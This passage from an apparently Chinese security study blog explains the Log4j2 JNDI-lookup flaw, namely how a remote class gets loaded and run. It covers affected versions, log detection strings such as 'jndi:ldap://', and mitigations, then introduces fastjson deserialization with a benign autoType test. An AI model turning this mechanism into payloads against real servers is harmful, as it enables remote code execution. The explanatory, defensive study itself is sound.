&amp;#123;&amp;#125;&amp;quot;,content);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //https://logging.apache.org/log4j/2.x/manual/lookups.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String content2 = &amp;quot;$&amp;#123;java:os&amp;#125;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        logger.trace(&amp;quot;hello &amp;#123;&amp;#125;&amp;quot;,content2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String content3 = &amp;quot;$&amp;#123;java:vm&amp;#125;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        logger.trace(&amp;quot;hello &amp;#123;&amp;#125;&amp;quot;,content3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;进一步解析 {}，发现是 JNDI 扩展内容。&lt;/p&gt;
&lt;p&gt;再进一步解析，发现了是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。&lt;/p&gt;
&lt;p&gt;最后，调用具体负责 LDAP 的模块去请求对应的数据。&lt;/p&gt;
&lt;p&gt;3。从指定动态地址下载对象。由于 ldap 目录中不存在 Exploit 类，因此会向远程 http 服务器请求&lt;/p&gt;
&lt;p&gt;通过命令引用可以远程下载一个 class 文件，然后下载后加载起来构建对象。&lt;/p&gt;
&lt;p&gt;由于代码在 NamingManager.java 中创建实例，导致静态方法自动执行，如果远程下载的文件中有恶意代码，也会自动执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@SuppressWarnings(&amp;quot;deprecation&amp;quot;) // Class.newInstance&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ObjectFactory result = (clas != null) ? (ObjectFactory) clas.newInstance() : null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;1、使用了 log4j 的组件，并且版本在 2.x &amp;lt;= 2.14.1&lt;/p&gt;
&lt;p&gt;2、JDK 版本小于 8u191、7u201、6u211&lt;/p&gt;
&lt;p&gt;资产排查&lt;/p&gt;
&lt;p&gt;1、pom 版本检查&lt;/p&gt;
&lt;p&gt;2、可以通过检查日志中是否存在 “jndi:ldap://” 、“jndi:rmi” 、 “&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ruc2xvZy5jbg==&#34;&gt;dnslog.cn&lt;/span&gt;” 等字符来发现可能的攻击行为。&lt;/p&gt;
&lt;p&gt;3、检查日志中是否存在相关堆栈报错，堆栈里是否有 JndiLookup、ldapURLContext、getObjectFactoryFromReference 等与 jndi 调用相关的堆栈信息&lt;/p&gt;
&lt;p&gt;修复思路&lt;/p&gt;
&lt;p&gt;1、禁止用户请求参数出现攻击关键字&lt;/p&gt;
&lt;p&gt;2、禁止 lookup 下载远程文件（命名引用）&lt;/p&gt;
&lt;p&gt;3、禁止 Log4j 的应用连接外网&lt;/p&gt;
&lt;p&gt;4、禁止 Log4j 使用 lookup&lt;/p&gt;
&lt;p&gt;5、从 Log4j jar 包中中删除 lookup 2.10 以下&lt;/p&gt;
&lt;p&gt;1、将 Log4j 框架升级到 2.17.1 版本&lt;/p&gt;
&lt;p&gt;2、使用安全产品防护：WAF、RASP……&lt;/p&gt;
&lt;p&gt;临时方案&lt;/p&gt;
&lt;p&gt;1、升级 JDK&lt;/p&gt;
&lt;p&gt;2、修改 Log4j 配置&lt;/p&gt;
&lt;p&gt;3、删除 JndiLookup.class&lt;/p&gt;
&lt;p&gt;1、设置参数：&lt;/p&gt;
&lt;p&gt;log4j2.formatMsgNoLookups=True&lt;/p&gt;
&lt;p&gt;2、修改 JVM 参数：&lt;/p&gt;
&lt;p&gt;-Dlog4j2.formatMsgNoLookups=true&lt;/p&gt;
&lt;p&gt;3、系统环境变量：&lt;/p&gt;
&lt;p&gt;FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true&lt;/p&gt;
&lt;p&gt;4、禁止使用了 Log4j2 的应用所在服务器外连&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzODQyMDkzL2FydGljbGUvZGV0YWlscy8xMjIwNzQwMjA=&#34;&gt;(70 条消息) log4j2 漏洞_Archie_java 的博客 - CSDN 博客_log4j2 漏洞&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDkyMC5odG1s&#34;&gt;浅谈 Log4j2 漏洞 | NOSEC 安全讯息平台 - 白帽汇安全研究院&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;fastjson-反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fastjson-反序列化&#34;&gt;#&lt;/a&gt; fastjson 反序列化&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24vd2lraS9RdWljay1TdGFydC1DTg==&#34;&gt;https://github.com/alibaba/fastjson/wiki/Quick-Start-CN&lt;/span&gt; 1.2.76&lt;/p&gt;
&lt;p&gt;l 速度快&lt;/p&gt;
&lt;p&gt;l 使用广泛&lt;/p&gt;
&lt;p&gt;l 测试完备&lt;/p&gt;
&lt;p&gt;l 使用简单&lt;/p&gt;
&lt;p&gt;l 功能完备&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;序列化的时候，会调用成员变量的 get 方法，私有成员变量不会被序列化。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反序列化的时候，会调用成员变量的类的构造方法，set 方法，public 修饰的成员全部自动赋值。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;反序列化代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JSON.parseObject() 返回实际类型对象,显示指定对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User user1 = JSON.parseObject(serializedStr, User.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JSON.parse() 返回JsonObject对象，需要强制类型转换&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Object obj1 =JSON.parse(serializedStr);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.alibaba.fastjson.JSON;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; com.alibaba.fastjson.parser.ParserConfig;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;JsonTest&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 从1.2.25开始，autotype默认关闭&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ParserConfig.getGlobalInstance().setAutoTypeSupport(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 序列化字符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;serializedStr&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;\&amp;quot;@type\&amp;quot;:\&amp;quot;com.wuya.test.User\&amp;quot;,\&amp;quot;name\&amp;quot;:\&amp;quot;wuya\&amp;quot;,\&amp;quot;age\&amp;quot;:66, \&amp;quot;flag\&amp;quot;: true,\&amp;quot;sex\&amp;quot;:\&amp;quot;boy\&amp;quot;,\&amp;quot;address\&amp;quot;:\&amp;quot;china\&amp;quot;&amp;#125;&amp;quot;&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;serializedStr=&amp;quot;&lt;/span&gt; + serializedStr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;-----------------------------------------------\n\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//通过parse方法进行反序列化，返回的是一个JSONObject]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;JSON.parse(serializedStr)：&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;obj1&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;JSON.parse(serializedStr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parse反序列化对象名称:&amp;quot;&lt;/span&gt; + obj1.getClass().getName());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parse反序列化：&amp;quot;&lt;/span&gt; + obj1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;-----------------------------------------------\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 通过parseObject,不指定类，返回的是一个JSONObject&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;JSON.parseObject(serializedStr)：&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;obj2&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; JSON.parseObject(serializedStr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseObject反序列化对象名称:&amp;quot;&lt;/span&gt; + obj2.getClass().getName());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseObject反序列化:&amp;quot;&lt;/span&gt; + obj2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;-----------------------------------------------\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 通过parseObject,指定为object.class&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;JSON.parseObject(serializedStr, Object.class)：&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;obj3&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; JSON.parseObject(serializedStr, Object.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseObject反序列化对象名称:&amp;quot;&lt;/span&gt; + obj3.getClass().getName());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseObject反序列化:&amp;quot;&lt;/span&gt; + obj3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;-----------------------------------------------\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 通过parseObject,指定为User.class&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;JSON.parseObject(serializedStr, User.class)：&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;obj4&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; JSON.parseObject(serializedStr, User.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseObject反序列化对象名称:&amp;quot;&lt;/span&gt; + obj4.getClass().getName());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;parseObject反序列化:&amp;quot;&lt;/span&gt; + obj4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;-----------------------------------------------\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JSON.parse(serializedStr)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User default Constructor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setAge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setFlag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parse反序列化对象名称:com.wuya.test.User&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parse反序列化：User&amp;#123;name=&amp;#x27;wuya&amp;#x27;, age=66, flag=true, sex=&amp;#x27;boy&amp;#x27;, address=&amp;#x27;null&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JSON.parseObject(serializedStr)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User default Constructor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setAge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setFlag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User getAge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User isFlag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User getName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseObject反序列化:&amp;#123;&amp;quot;flag&amp;quot;:true,&amp;quot;sex&amp;quot;:&amp;quot;boy&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;wuya&amp;quot;,&amp;quot;age&amp;quot;:66&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JSON.parseObject(serializedStr, Object.class)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User default Constructor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setAge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setFlag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseObject反序列化对象名称:com.wuya.test.User&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseObject反序列化:User&amp;#123;name=&amp;#x27;wuya&amp;#x27;, age=66, flag=true, sex=&amp;#x27;boy&amp;#x27;, address=&amp;#x27;null&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JSON.parseObject(serializedStr, User.class)：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User default Constructor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setAge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call User setFlag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseObject反序列化对象名称:com.wuya.test.User&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseObject反序列化:User&amp;#123;name=&amp;#x27;wuya&amp;#x27;, age=66, flag=true, sex=&amp;#x27;boy&amp;#x27;, address=&amp;#x27;null&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;@ type 自省&lt;/p&gt;
&lt;p&gt;我们可以发现，在反序列化是没有类名的，可以通过自省传入类名。&lt;/p&gt;
&lt;p&gt;但不包含类名的问题是，当子类中包含接口或抽象类的时候，类型丢失&lt;/p&gt;
